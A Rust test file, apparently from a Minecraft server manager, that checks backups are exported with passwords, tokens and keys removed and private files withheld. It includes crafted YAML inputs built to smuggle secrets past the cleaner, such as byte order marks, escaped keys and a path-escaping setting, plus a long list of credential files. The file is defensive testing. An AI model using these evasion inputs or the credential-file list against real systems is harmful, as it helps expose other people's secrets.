//! Moving images between computers, against a core on a loopback port: a Fabric server
//! (never started) is backed up and exported, the file is uploaded, inspected and made into
//! a new server with the fake server setup and the fake Modrinth, so nothing reaches the
//! network, no server jar is downloaded and no EULA is accepted unless a test asks.

use std::collections::HashSet;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use lodestone_image::container::{self, Limits};
use lodestone_image::{Image, Source};
use reqwest::{Method, StatusCode};
use serde_json::{json, Value};

use super::export::{blank_secrets, blank_yaml_values, is_private, secret_property};
use crate::auth::{permission::UserPermission, user::User};
use crate::events::CausedBy;
use crate::global_settings::{CodeExecutionSwitch, GlobalSettingsData};
use crate::images::ModrinthHint;
use crate::modrinth::fake::{FakeModrinth, FakeVersion};
use crate::test_util::{serve_api, test_app_state, wait_until};
use crate::types::{DotLodestoneConfig, InstanceUuid};
use crate::AppState;

pub(super) fn init_paths() {
    static LODESTONE_DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    let dir = LODESTONE_DIR.get_or_init(|| tempfile::tempdir().unwrap());
    crate::prelude::try_init_paths(dir.path().to_owned()).unwrap();
}

/// Sodium on the fake Modrinth: what the server's `mods/sodium.jar` is.
pub(super) fn sodium() -> FakeVersion {
    FakeVersion::new("AANobbMI", "v1", "sodium.jar").game_versions(&["1.21.1"])
}

pub(super) struct Core {
    pub dir: tempfile::TempDir,
    pub state: AppState,
    pub modrinth: Arc<FakeModrinth>,
    pub setup: Arc<crate::server_setup::FakeSetup>,
    pub root: PathBuf,
    pub base: String,
    pub client: reqwest::Client,
    pub uuid: InstanceUuid,
}

pub(super) const RCON_PASSWORD: &str = "hunter2-rcon";
pub(super) const MANAGEMENT_SECRET: &str = "s3cr3t-management";
pub(super) const VELOCITY_SECRET: &str = "velocity-forwarding-secret";
pub(super) const PLUGIN_PASSWORD: &str = "plugin-db-password";
pub(super) const OLD_PASSWORD: &str = "an-old-password";
pub(super) const LEGACY_PAPER_SECRET: &str = "paper-yml-forwarding-secret";
pub(super) const SENTRY_DSN: &str = "https://sentry-key@sentry.example/1";
pub(super) const ACCOUNT_TOKEN: &str = "microsoft-refresh-token";
pub(super) const FILTER_KEY: &str = "text-filter-api-key";
pub(super) const PCF_SECRET: &str = "pcf-forwarding-secret";

fn write(root: &Path, relative: &str, contents: &[u8]) {
    let path = root.join(relative);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, contents).unwrap();
}

/// A core with one stopped Fabric server holding everything an export must handle: secrets
/// in `server.properties` and Paper's config, a plugin's settings, Lodestone's settings
/// with a Java command, the server software, a JVM crash log, the console's history, an
/// operator, a world, a Modrinth mod and one of the owner's own.
pub(super) async fn core() -> Core {
    init_paths();
    let dir = tempfile::tempdir().unwrap();
    let mut state = test_app_state(
        dir.path(),
        GlobalSettingsData {
            code_execution_enabled: false,
            safe_mode: false,
            ..Default::default()
        },
    )
    .await;
    let modrinth = Arc::new(FakeModrinth::default());
    modrinth.add(sodium());
    state.mods = Arc::new(crate::mods::ModsState::new(
        modrinth.clone(),
        crate::modpack::store::PackStore::new(dir.path().join("modpacks")),
    ));
    let setup = Arc::new(crate::server_setup::FakeSetup::default());
    state.server_setup = setup.clone();
    let instances = dir.path().join("instances");
    let root = instances.join("fabric");
    let uuid = InstanceUuid::default();
    write(
        &root,
        ".lodestone_config",
        serde_json::to_string(&DotLodestoneConfig::new(
            uuid.clone(),
            crate::traits::t_configurable::GameType::MinecraftJava,
        ))
        .unwrap()
        .as_bytes(),
    );
    write(
        &root,
        ".lodestone_minecraft_config.json",
        json!({
            "name": "Survival", "version": "1.21.1",
            "flavour": { "fabric": { "loader_version": "0.16.10", "installer_version": null } },
            "description": "", "cmd_args": ["-Dsecret.flag=1"], "java_cmd": "/opt/java/bin/java",
            "port": 25571, "min_ram": 1024, "max_ram": 2048, "auto_start": false,
            "restart_on_crash": false, "backup_period": null, "jre_major_version": 21,
            "has_started": false
        })
        .to_string()
        .as_bytes(),
    );
    write(
        &root,
        "server.properties",
        format!(
            "#Minecraft server properties\n#rcon.password={OLD_PASSWORD}\nserver-port=25571\nserver-ip=10.0.0.5\nlevel-name=world\nmotd=Hello\nenable-rcon=true\nrcon.password={RCON_PASSWORD}\nmanagement-server-secret={MANAGEMENT_SECRET}\ntext-filtering-config={{\"apiKey\":\"{FILTER_KEY}\"}}\nonline-mode=false\n"
        )
        .as_bytes(),
    );
    write(&root, "eula.txt", b"eula=true\n");
    write(&root, "server.jar", b"server jar");
    write(&root, "libraries/net/fabricmc/loader.jar", b"loader");
    write(&root, "world/level.dat", b"level v1");
    write(&root, "world/region/r.0.0.mca", b"region v1");
    write(&root, "mods/sodium.jar", &sodium().content);
    write(&root, "mods/own.jar", b"the owner's own mod");
    write(&root, "config/sodium-options.json", b"{\"quality\": 2}");
    write(
        &root,
        "config/paper-global.yml",
        format!("proxies:\n  velocity:\n    enabled: true\n    secret: {VELOCITY_SECRET}\n")
            .as_bytes(),
    );
    write(&root, "plugins/Essentials.jar", b"plugin jar");
    write(
        &root,
        "plugins/Essentials/config.yml",
        format!("database:\n  password: {PLUGIN_PASSWORD}\n").as_bytes(),
    );
    write(&root, "hs_err_pid1234.log", b"java -Daccess.token=xyz");
    // Paper's settings before 1.19, Pufferfish's, a Forge proxy mod's
    write(
        &root,
        "paper.yml",
        format!(
            "settings:\n  velocity-support:\n    enabled: true\n    secret: |-\n      {LEGACY_PAPER_SECRET}\n    online-mode: true\n"
        )
        .as_bytes(),
    );
    write(
        &root,
        "pufferfish.yml",
        format!("sentry-dsn: '{SENTRY_DSN}'\nmax-loads-per-projectile: 8\n").as_bytes(),
    );
    write(
        &root,
        "config/pcf-common.toml",
        format!("[modernForwarding]\nforwardingSecret = \"{PCF_SECRET}\"\n").as_bytes(),
    );
    // what an installer and a pasted game folder leave
    write(&root, "forge-installer.log", b"installer output");
    write(&root, "forge-1.20.1-installer.jar.log", b"installer output");
    write(
        &root,
        "launcher_accounts.json",
        format!("{{\"token\": \"{ACCOUNT_TOKEN}\"}}").as_bytes(),
    );
    write(&root, "command_history.txt", b"/login hunter2");
    write(&root, "banned-ips.json", br#"[{"ip":"203.0.113.9"}]"#);
    write(&root, ".console_history", b"op someone");
    write(
        &root,
        "ops.json",
        br#"[{"uuid":"069a79f4-44e9-4726-a5be-fca90e38aaf5","name":"Notch","level":4,"bypassesPlayerLimit":false}]"#,
    );
    let executor = CodeExecutionSwitch::new(false);
    let restored = crate::restore_instances(&instances, state.event_broadcaster.clone(), executor)
        .await
        .unwrap();
    for (uuid, instance) in crate::snapshot_instances(&restored) {
        state.instances.insert(uuid, instance);
    }
    assert_eq!(state.instances.len(), 1);
    // Lodestone matched the jar to Modrinth's file (as the Mods tab does), so the server's
    // content image records it as a Modrinth file
    let version = &sodium().version;
    state.images.note_modrinth(
        &version.files[0].sha512,
        ModrinthHint {
            url: Some(version.files[0].url.clone()),
            ..Default::default()
        },
    );
    let base = serve_api(state.clone()).await;
    Core {
        dir,
        state,
        modrinth,
        setup,
        root,
        base,
        client: reqwest::Client::new(),
        uuid,
    }
}

impl Core {
    pub async fn user(&self, name: &str, is_owner: bool, permissions: UserPermission) -> String {
        let user = User::new(name.to_string(), "pw", is_owner, false, permissions);
        self.state
            .users_manager
            .write()
            .await
            .add_user(user.clone(), CausedBy::System)
            .await
            .unwrap();
        user.create_jwt().unwrap().to_string()
    }

    pub async fn owner(&self) -> String {
        self.user("owner", true, Default::default()).await
    }

    /// A user with these permissions, viewing and reading the core's server.
    pub async fn member(&self, name: &str, set: impl Fn(&mut UserPermission)) -> String {
        let mut permissions = UserPermission {
            can_view_instance: HashSet::from([self.uuid.clone()]),
            ..Default::default()
        };
        set(&mut permissions);
        self.user(name, false, permissions).await
    }

    /// `path` is relative to `/api/v1`.
    pub async fn call(
        &self,
        method: Method,
        path: &str,
        token: &str,
        body: Option<Value>,
    ) -> (StatusCode, Value) {
        let mut request = self
            .client
            .request(method, format!("{}{path}", self.base))
            .bearer_auth(token);
        if let Some(body) = body {
            request = request.json(&body);
        }
        let response = request.send().await.unwrap();
        let status = response.status();
        let text = response.text().await.unwrap();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    /// Takes a backup of the server and waits for it. Returns its id.
    pub async fn backup(&self, token: &str) -> String {
        let backups = format!("/instance/{}/backups", self.uuid);
        let (status, body) = self
            .call(Method::POST, &backups, token, Some(json!({})))
            .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        wait_until("the backup is taken", || async {
            let (_, list) = self.call(Method::GET, &backups, token, None).await;
            list["running"].is_null() && list["backups"][0]["id"].is_string()
        })
        .await;
        let (_, list) = self.call(Method::GET, &backups, token, None).await;
        list["backups"][0]["id"].as_str().unwrap().to_string()
    }

    /// Exports the backup `id` and downloads the file into the test's folder, checking
    /// that the answer names the EULA and the RCON password as taken out.
    pub async fn export(&self, token: &str, id: &str, body: Value) -> PathBuf {
        let (reply, file) = self.export_file(token, id, body).await;
        assert!(
            names(&reply["blanked"]).contains(&"server.properties: rcon.password".to_string()),
            "{reply}"
        );
        file
    }

    /// Exports the backup `id` and downloads the file into the test's folder. Returns the
    /// export's answer and the file.
    pub async fn export_file(&self, token: &str, id: &str, body: Value) -> (Value, PathBuf) {
        let (status, reply) = self
            .call(
                Method::POST,
                &format!("/instance/{}/backups/{id}/export", self.uuid),
                token,
                Some(body),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{reply}");
        let left_out = &reply["left_out"]["names"];
        assert!(
            left_out.as_array().unwrap().contains(&json!("eula.txt")),
            "{reply}"
        );
        let file_name = reply["file_name"].as_str().unwrap().to_string();
        assert!(file_name.ends_with(&format!("{id}.lodeimg")), "{file_name}");
        let response = self
            .client
            .get(format!(
                "{}/file/{}",
                self.base,
                reply["key"].as_str().unwrap()
            ))
            .bearer_auth(token)
            .send()
            .await
            .unwrap();
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = response.bytes().await.unwrap();
        assert_eq!(bytes.len() as u64, reply["size"].as_u64().unwrap());
        let out = self
            .dir
            .path()
            .join(format!("{}-{file_name}", rand_suffix()));
        std::fs::write(&out, &bytes).unwrap();
        (reply, out)
    }
}

pub(super) fn rand_suffix() -> String {
    crate::util::rand_alphanumeric(8)
}

/// Every file's bytes in the zip at `path`, decompressed.
fn all_bytes(path: &Path) -> Vec<(String, Vec<u8>)> {
    let mut zip = zip::ZipArchive::new(std::fs::File::open(path).unwrap()).unwrap();
    (0..zip.len())
        .map(|i| {
            let mut file = zip.by_index(i).unwrap();
            let name = file.name().unwrap().to_string();
            let mut bytes = Vec::new();
            file.read_to_end(&mut bytes).unwrap();
            (name, bytes)
        })
        .collect()
}

fn paths(image: &Image) -> Vec<&str> {
    image.entries.iter().map(|e| e.path.as_str()).collect()
}

#[test]
fn secret_properties_are_known_by_their_names() {
    for key in [
        "rcon.password",
        "management-server-secret",
        "discord-bot-token",
        "Database.Password",
        "text-filtering-config",
    ] {
        assert!(secret_property(key), "{key}");
    }
    for key in ["motd", "server-port", "enable-rcon", "online-mode"] {
        assert!(!secret_property(key), "{key}");
    }
}

#[test]
fn server_properties_are_blanked_without_their_comments() {
    let original = b"#a comment\n#rcon.password=old\nmotd=Hi\nrcon.password=one\nrcon.password=two\nmanagement-server-secret=\nserver-port=25565\n";
    let (clean, blanked) = blank_secrets(original).unwrap();
    let text = String::from_utf8(clean).unwrap();
    assert_eq!(
        text,
        "motd=Hi\nrcon.password=\nmanagement-server-secret=\nserver-port=25565\n"
    );
    assert_eq!(blanked, ["rcon.password"]);
    // a file that is already clean is left as it is
    assert!(blank_secrets(text.as_bytes()).is_none());
}

#[test]
fn yaml_secrets_are_blanked_in_place() {
    let original = b"proxies:\n  velocity:\n    enabled: true\n    secret: abc # x\n  bungee: {}\nsecret: ''\n";
    let (clean, keys) = blank_yaml_values(original, &["secret"]).unwrap();
    assert_eq!(
        String::from_utf8(clean).unwrap(),
        "proxies:\n  velocity:\n    enabled: true\n    secret: ''\n  bungee: {}\nsecret: ''\n"
    );
    assert_eq!(keys, ["secret"]);
    assert!(blank_yaml_values(b"secret: ''\nother: 1\n", &["secret"]).is_none());
    assert!(blank_yaml_values(b"secret:\nother: 1\n", &["secret"]).is_none());
}

/// A value that goes on over the following lines goes with them, in the forms the editor
/// reads for certain (a block scalar, a plain or single-quoted scalar wrapped onto lines
/// more indented than its key), and a key written with spaces or quotes is still found. A
/// value in any other form (a scalar on the line under an empty key, a double-quoted one
/// over several lines) withholds the file.
#[test]
fn yaml_secrets_over_several_lines_are_blanked_whole() {
    use super::export::{clean_yaml, YamlCleaning};
    let cases: [(&str, &str); 6] = [
        (
            "proxies:\n  velocity:\n    secret: |-\n      TOPSECRETVALUE\n    enabled: true\n",
            "proxies:\n  velocity:\n    secret: ''\n    enabled: true\n",
        ),
        (
            "proxies:\n  velocity:\n    secret: >\n      TOP\n\n      SECRETVALUE\nother: 1\n",
            "proxies:\n  velocity:\n    secret: ''\nother: 1\n",
        ),
        (
            "velocity:\n  secret : TOPSECRETVALUE\n",
            "velocity:\n  secret: ''\n",
        ),
        (
            "velocity:\n  \"secret\": TOPSECRET\n    VALUE\n  enabled: true\n",
            "velocity:\n  \"secret\": ''\n  enabled: true\n",
        ),
        (
            "velocity:\n  secret: 'TOPSECRET\n     VALUE'\n  enabled: true\n",
            "velocity:\n  secret: ''\n  enabled: true\n",
        ),
        (
            "a:\r\n  secret:\r\n  - TOPSECRET\r\n  - VALUE\r\n\r\nb: 1\r\n",
            "a:\r\n  secret: ''\r\n\r\nb: 1\r\n",
        ),
    ];
    for (original, expected) in cases {
        let (clean, keys) = blank_yaml_values(original.as_bytes(), &["secret"])
            .unwrap_or_else(|| panic!("{original:?} kept its secret"));
        let clean = String::from_utf8(clean).unwrap();
        assert_eq!(clean, expected, "{original:?}");
        assert!(!clean.contains("TOPSECRET") && !clean.contains("VALUE"));
        assert_eq!(keys, ["secret"]);
    }
    for odd in [
        "velocity:\n  secret:\n      TOPSECRETVALUE\n  enabled: true\n",
        "velocity:\n  \"secret\": \"TOPSECRET\n    VALUE\"\n  enabled: true\n",
        "a:\r\n  secret: # the key\r\n    TOPSECRETVALUE\r\n\r\nb: 1\r\n",
        // a block scalar's line less indented than its first
        "a:\n  secret: |\n      TOP\n    SECRET\n",
        // a wrapped value with a comment before its next line
        "a:\n  secret: TOP # x\n    SECRET\n",
        // a blank line inside a single-quoted value
        "a:\n  secret: 'TOP\n\n    SECRET'\n",
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
}

/// A byte order mark hides nothing: one at the start is read past as a YAML reader does
/// (so a flow mapping after it is still seen, and withheld), one anywhere else withholds
/// the file, and a readable file with one keeps it. Each of these passed the old checks
/// as `Unchanged`, while SnakeYAML read the sender's restart script, worlds' folder and
/// forwarding secret.
#[test]
fn a_byte_order_mark_hides_no_setting() {
    use super::export::{clean_yaml, pin_yaml_all, YamlCleaning};
    let spigot = "\u{FEFF}{settings:{\nx: y, restart-script: config/run.txt\n}}\n";
    assert_eq!(
        pin_yaml_all(
            spigot.len() as u64,
            spigot.as_bytes(),
            &[("restart-script", "./start.sh")]
        ),
        YamlCleaning::Withhold
    );
    let bukkit =
        "\u{FEFF}{settings:{\nx: y, world-container: ../.., permissions-file: config/p.yml\n}}\n";
    assert_eq!(
        pin_yaml_all(
            bukkit.len() as u64,
            bukkit.as_bytes(),
            &[
                ("permissions-file", "permissions.yml"),
                ("world-container", ".")
            ]
        ),
        YamlCleaning::Withhold
    );
    let paper = "\u{FEFF}{proxies:{velocity:{\nenabled: true, online-mode: true, secret: HOSTILE-SECRET\n}}}\n";
    assert_eq!(
        clean_yaml(paper.len() as u64, paper.as_bytes(), &["secret"]),
        YamlCleaning::Withhold
    );
    for odd in [
        "a: 1\n\u{FEFF}secret: abc\n",
        "\u{FEFF}\u{FEFF}secret: abc\n",
        "a:\n  b: \u{FEFF}{secret: abc}\n",
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
    let readable = "\u{FEFF}proxies:\n  velocity:\n    secret: abc\n";
    assert_eq!(
        clean_yaml(readable.len() as u64, readable.as_bytes(), &["secret"]),
        YamlCleaning::Blanked(
            "\u{FEFF}proxies:\n  velocity:\n    secret: ''\n"
                .as_bytes()
                .to_vec(),
            vec!["secret".to_string()]
        )
    );
}

/// A quote inside a plain scalar is the scalar's (`a"b`), not the start of a quoted one:
/// a flow list whose items hold quotes is withheld rather than read as one item, which
/// would hide the flow mapping after it.
#[test]
fn a_quote_inside_a_plain_scalar_opens_nothing() {
    use super::export::{clean_yaml, YamlCleaning};
    for odd in [
        // the old check read `"b, {"` and `": evil}, c"` as quoted scalars, and passed
        // the escaped key between them that SnakeYAML reads as `secret`
        "proxies:\n  velocity: [a\"b, {\"s\\x65cret\": evil}, c\"]\n",
        "proxies:\n  velocity: [a\"b, {secret: evil}, c\"]\n",
        "proxies:\n  velocity: [a'b, {secret: evil}, c']\n",
        "proxies:\n  - a\"b: [\"x\n    secret: evil\n",
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
    // in block style a quote inside a plain scalar is plain text, as Spigot writes it
    let message =
        "messages:\n  unknown-command: Unknown command. Type \"/help\" for help.\nsecret: x\n";
    assert_eq!(
        clean_yaml(message.len() as u64, message.as_bytes(), &["secret"]),
        YamlCleaning::Blanked(
            message.replace("secret: x", "secret: ''").into_bytes(),
            vec!["secret".to_string()]
        )
    );
}

#[test]
fn private_files_are_known_in_any_letter_case() {
    let private = |text: &str, plugins: bool| {
        is_private(&lodestone_image::CanonicalPath::new(text).unwrap(), plugins)
    };
    for path in [
        ".lodestone_minecraft_config.json",
        "mods/.lodestone_client_mods.json",
        ".LodeStone_modpack/pack.json",
        "EULA.TXT",
        ".console_history",
        "server.jar",
        "Forge-1.20.1.JAR",
        "libraries/x/y.jar",
        "Versions/1.21/server.jar",
        "run.sh",
        "start.sh",
        "Start.CMD",
        "launch.bat",
        "run.ps1",
        "Start.command",
        "server.exe",
        "libnative.so",
        "hs_err_pid99.log",
        "core.4321",
        "forwarding.secret",
        "config/FabricProxy-Lite.toml",
        "Config/PCF-Common.toml",
        "config/proxy-compatible-forge.toml",
        "Config/Proxy-Compatible-Forge.CFG",
        "config/FabricProxy.toml",
        "config/neovelocity-common.toml",
        "CONFIG/NeoVelocity-Common.toml",
        "config/neoforwarding-server.toml",
        "config/some-velocity-mod.json5",
        "config/ForwardingMod/secret.txt",
        "config/legacy-backup/paper.yml.old",
        "Config/Legacy-Backup/paper.yml.old",
        "config/voicechat-discord.yml",
        "config/simple-discord-link/simple-discord-link.toml",
        "sdlinkstorage/sdlink.enc",
        "EasyAuth/easyauth.db",
        "easyauth/easyauth.db",
        "config/EasyAuth/storage.conf",
        "config/EasyAuth/proxy.conf",
        "config/ledger.toml",
        // Discord-MC-Chat's, Mc2Discord's and Tebex's (as a mod) settings
        "config/discord-mc-chat.json",
        "Config/Discord-MC-Chat-Backup.json",
        "config/discord_mc_chat/config.yml",
        "config/mc2discord.toml",
        "mods/tebex/config.yml",
        "Mods/Tebex/config.yml",
        "config/floodgate/key.pem",
        "config/floodgate/config.yml",
        "Plugins/Floodgate/k2.pem",
        "Config/LuckPerms/LuckPerms.conf",
        "plugins/LuckPerms/config.yml",
        "plugins/DiscordSRV/config.yml",
        "config/Discord-Integration.toml",
        "config/bluemap/storages/sql.conf",
        "plugins/BlueMap/storages/sql.conf",
        "dynmap/configuration.txt",
        "plugins/dynmap/configuration.txt",
        "plugins/Essentials/config.yml",
        "Plugins/LuckPerms/data/db.h2",
        "forge-installer.log",
        "Installer.log",
        "forge-1.20.1-47.2.0-installer.jar.log",
        "banned-ips.json",
        "command_history.txt",
        "config/x/Command_History.txt",
        "hotbar.nbt",
        "ias.json",
        "essential/microsoft_accounts.json",
        "Essential/Mojang_Accounts.json",
        "launcher_profiles.json",
        "Launcher_Accounts_Microsoft_Store.json",
        "launcher_msa_credentials.bin",
    ] {
        assert!(private(path, false), "{path}");
    }
    for path in [
        "server.properties",
        "mods/sodium.jar",
        "plugins/Essentials.jar",
        "config/sodium.json",
        "world/level.dat",
        "ops.json",
        "banned-players.json",
        "logs/installer.log.txt",
        "config/launcher_profiles.json",
    ] {
        assert!(!private(path, false), "{path}");
    }
    assert!(!private("plugins/Essentials/config.yml", true));
    assert!(private(".lodestone_minecraft_config.json", true));
    // a key never travels, even with the plugins' settings
    assert!(private("plugins/floodgate/key.pem", true));
    // Floodgate's settings name its key's file, so its whole folder is a way in
    assert!(private("plugins/floodgate/config.yml", true));
    assert!(private("plugins/floodgate/k2.pem", true));
    assert!(private("Plugins/LuckPerms/config.yml", true));
    assert!(private("plugins/DiscordSRV/config.yml", true));
    assert!(private("plugins/DiscordSRV/.token", true));
    assert!(private("Plugins/discordsrv/.TOKEN", true));
    assert!(private("plugins/DiscordIntegration/config.toml", true));
    assert!(private("Plugins/discordintegration/Config.toml", true));
    assert!(!private("plugins/DiscordSRV/linkedaccounts.json", true));
    // the copies DiscordSRV keeps of its settings when it updates them, token and all
    assert!(private(
        "plugins/DiscordSRV/config.yml-build.1.28.0.old",
        true
    ));
    assert!(private(
        "Plugins/discordsrv/Config.yml-build.1.27.0.OLD",
        true
    ));
    assert!(!private(
        "plugins/DiscordSRV/messages.yml-build.1.28.0.old",
        true
    ));
    // ServerTap's REST API key, which runs console commands
    assert!(private("plugins/ServerTap/config.yml", true));
    assert!(private("Plugins/servertap/Config.yml", true));
    assert!(private("plugins/voicechat-discord/config.yml", true));
    assert!(private("Plugins/VoiceChat-Discord/Config.yml", true));
    // Tebex's store key as a plugin and the old BuycraftX's, even with the plugins' settings
    assert!(private("plugins/Tebex/config.yml", true));
    assert!(private("plugins/BuycraftX/config.properties", true));
    assert!(!private("plugins/Tebex/lang.yml", true));
    assert!(!private("config/voicechat-server.properties", false));
    assert!(!private("config/legacy-backup.txt", false));
    assert!(!private("world/sdlinkstorage/x", false));
    // scripts only at the top are the server's software; a plugin's or a world's stay
    assert!(!private("world/data/raids.dat", false));
    assert!(!private("config/scripts/start.sh", false));
    assert!(!private("server.properties.sh.txt", false));
    assert!(!private("config/floodgate.json", false));
}

#[tokio::test]
async fn a_backup_is_exported_without_its_secrets() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let backup = core.state.backups.load(&core.uuid, &id).await.unwrap();
    let file = core.export(&owner, &id, json!({})).await;

    let mut opened = container::open(&file, &Limits::default()).unwrap();
    let image = opened.image().clone();
    let content = opened.linked().first().cloned().expect("its content image");
    assert_eq!(image.content.as_deref(), Some(content.id.as_str()));
    assert_ne!(image.id, backup.image.id, "a derived image, sealed anew");
    assert_eq!(image.producer.app, lodestone_image::manifest::App::Core);
    assert!(image.label.as_deref().unwrap().starts_with("Survival – "));
    assert_eq!(image.parent, None);

    for listed in [&image, &content] {
        let names = paths(listed);
        for gone in [
            ".lodestone_minecraft_config.json",
            "eula.txt",
            "server.jar",
            "libraries/net/fabricmc/loader.jar",
            "hs_err_pid1234.log",
            ".console_history",
            "plugins/Essentials/config.yml",
            "forge-installer.log",
            "forge-1.20.1-installer.jar.log",
            "launcher_accounts.json",
            "command_history.txt",
            "banned-ips.json",
            "config/pcf-common.toml",
        ] {
            assert!(!names.contains(&gone), "{gone} in {names:?}");
        }
        assert!(!names.iter().any(|p| p.contains(".lodestone")), "{names:?}");
        assert!(listed.excludes.contains(&"/eula.txt".to_string()));
        assert!(listed.excludes.contains(&"plugins/*/".to_string()));
    }
    let names = paths(&image);
    for kept in [
        "server.properties",
        "ops.json",
        "plugins/Essentials.jar",
        "mods/own.jar",
        "mods/sodium.jar",
        "saves/world/level.dat",
    ] {
        assert!(names.contains(&kept), "{kept} not in {names:?}");
    }

    // the Modrinth mod travels as a reference, in both images, its bytes not carried
    let images = [&image, &content];
    let carried = container::carried_objects(&images).unwrap();
    for listed in [&image, &content] {
        let sodium = listed
            .entries
            .iter()
            .find(|e| e.path.as_str() == "mods/sodium.jar")
            .unwrap();
        assert!(
            matches!(sodium.source, Source::Modrinth { .. }),
            "{sodium:?}"
        );
        assert!(!carried.contains_key(&sodium.sha256));
    }

    // server.properties: blanked, its blanked keys named
    let properties = image
        .entries
        .iter()
        .find(|e| e.path.as_str() == "server.properties")
        .unwrap()
        .clone();
    let blanked = properties.extra.get("blanked").unwrap();
    assert_eq!(
        blanked,
        &json!([
            "rcon.password",
            "management-server-secret",
            "text-filtering-config"
        ])
    );
    for (file, key) in [("paper.yml", "secret"), ("pufferfish.yml", "sentry-dsn")] {
        let entry = image
            .entries
            .iter()
            .find(|e| e.path.as_str() == file)
            .unwrap_or_else(|| panic!("{file} travels, cleaned"));
        assert_eq!(entry.extra.get("blanked"), Some(&json!([key])), "{file}");
    }
    let text = String::from_utf8(opened.read_object(&properties.sha256, 1 << 20).unwrap()).unwrap();
    assert!(text.contains("rcon.password=\n"), "{text}");
    assert!(text.contains("motd=Hello"), "{text}");

    // no secret anywhere in the file, whatever entry might hold it
    for (name, bytes) in all_bytes(&file) {
        let text = String::from_utf8_lossy(&bytes);
        for secret in [
            RCON_PASSWORD,
            MANAGEMENT_SECRET,
            VELOCITY_SECRET,
            PLUGIN_PASSWORD,
            OLD_PASSWORD,
            LEGACY_PAPER_SECRET,
            SENTRY_DSN,
            ACCOUNT_TOKEN,
            FILTER_KEY,
            PCF_SECRET,
            "203.0.113.9",
            "/login hunter2",
            "/opt/java/bin/java",
            "-Dsecret.flag",
            "access.token",
        ] {
            assert!(!text.contains(secret), "{secret} in {name}");
        }
    }
    // the server itself is as it was
    assert!(std::fs::read_to_string(core.root.join("server.properties"))
        .unwrap()
        .contains(RCON_PASSWORD));
}

/// A `server.properties` too big to clean, and a Paper config that isn't UTF-8, are
/// taken out rather than sent with their secrets.
#[tokio::test]
async fn files_that_cant_be_cleaned_are_taken_out() {
    let core = core().await;
    let owner = core.owner().await;
    let mut properties = format!("rcon.password={RCON_PASSWORD}\nmotd=").into_bytes();
    properties.extend(std::iter::repeat_n(b'x', (1 << 20) + 10));
    properties.push(b'\n');
    write(&core.root, "server.properties", &properties);
    let mut paper = format!("proxies:\n  velocity:\n    secret: {VELOCITY_SECRET}\n").into_bytes();
    paper.extend_from_slice(b"motd: \xff\xfe\n");
    write(&core.root, "config/paper-global.yml", &paper);
    let id = core.backup(&owner).await;
    let (reply, file) = core.export_file(&owner, &id, json!({})).await;
    let left_out = reply["left_out"]["names"].as_array().unwrap();
    for gone in ["server.properties", "config/paper-global.yml"] {
        assert!(left_out.contains(&json!(gone)), "{gone}: {reply}");
    }
    let opened = container::open(&file, &Limits::default()).unwrap();
    let content = opened.linked().first().cloned().unwrap();
    for listed in [opened.image(), &content] {
        let names = paths(listed);
        assert!(!names.contains(&"server.properties"), "{names:?}");
        assert!(!names.contains(&"config/paper-global.yml"), "{names:?}");
    }
    let excludes = &opened.image().excludes;
    assert!(
        excludes.contains(&"/server.properties".to_string()),
        "{excludes:?}"
    );
    assert!(
        excludes.contains(&"/config/paper-global.yml".to_string()),
        "{excludes:?}"
    );
    for (name, bytes) in all_bytes(&file) {
        let text = String::from_utf8_lossy(&bytes);
        for secret in [RCON_PASSWORD, VELOCITY_SECRET] {
            assert!(!text.contains(secret), "{secret} in {name}");
        }
    }
    // whoever opens it is told what the sender took out
    let (status, upload) = core.upload(&owner, &file, "big.lodeimg").await;
    assert_eq!(status, StatusCode::OK, "{upload}");
    // (the summary lists the first names, sorted, and counts them all)
    let left = names(&upload["summary"]["left_out"]);
    assert!(
        left.contains(&"/config/paper-global.yml".to_string()),
        "{left:?}"
    );
    let mut all = excludes.clone();
    all.sort();
    all.dedup();
    assert_eq!(
        upload["summary"]["left_out"]["count"],
        all.len(),
        "{upload}"
    );
}

/// The plugins' settings travel with "Include plugin settings", but never one that holds a
/// password: Essentials' `config.yml` holds the fixture's database password, so it is
/// withheld and named as such whatever the option says.
#[tokio::test]
async fn plugin_settings_travel_only_when_included() {
    let core = core().await;
    let owner = core.owner().await;
    write(
        &core.root,
        "plugins/Essentials/motd.txt",
        b"Welcome to the server\n",
    );
    let id = core.backup(&owner).await;
    let (reply, file) = core
        .export_file(&owner, &id, json!({ "include_plugin_data": true }))
        .await;
    let opened = container::open(&file, &Limits::default()).unwrap();
    let carried = paths(opened.image());
    assert!(
        carried.contains(&"plugins/Essentials/motd.txt"),
        "{carried:?}"
    );
    assert!(
        !carried.contains(&"plugins/Essentials/config.yml"),
        "{carried:?}"
    );
    assert_eq!(
        names(&reply["secrets_withheld"]),
        ["plugins/Essentials/config.yml"],
        "{reply}"
    );
    assert!(!opened.image().excludes.contains(&"plugins/*/".to_string()));
    // everything else is still taken out
    assert!(!carried.contains(&"eula.txt"));
    for (name, bytes) in all_bytes(&file) {
        assert!(
            !String::from_utf8_lossy(&bytes).contains(PLUGIN_PASSWORD),
            "the password in {name}"
        );
    }
}

#[tokio::test]
async fn exporting_needs_reading_the_servers_files() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let viewer = core.member("viewer", |_| {}).await;
    let path = format!("/instance/{}/backups/{id}/export", core.uuid);
    let (status, _) = core
        .call(Method::POST, &path, &viewer, Some(json!({})))
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let reader = core
        .member("reader", |p| {
            p.can_read_instance_file.insert(core.uuid.clone());
        })
        .await;
    let (status, body) = core.call(Method::POST, &path, &reader, None).await;
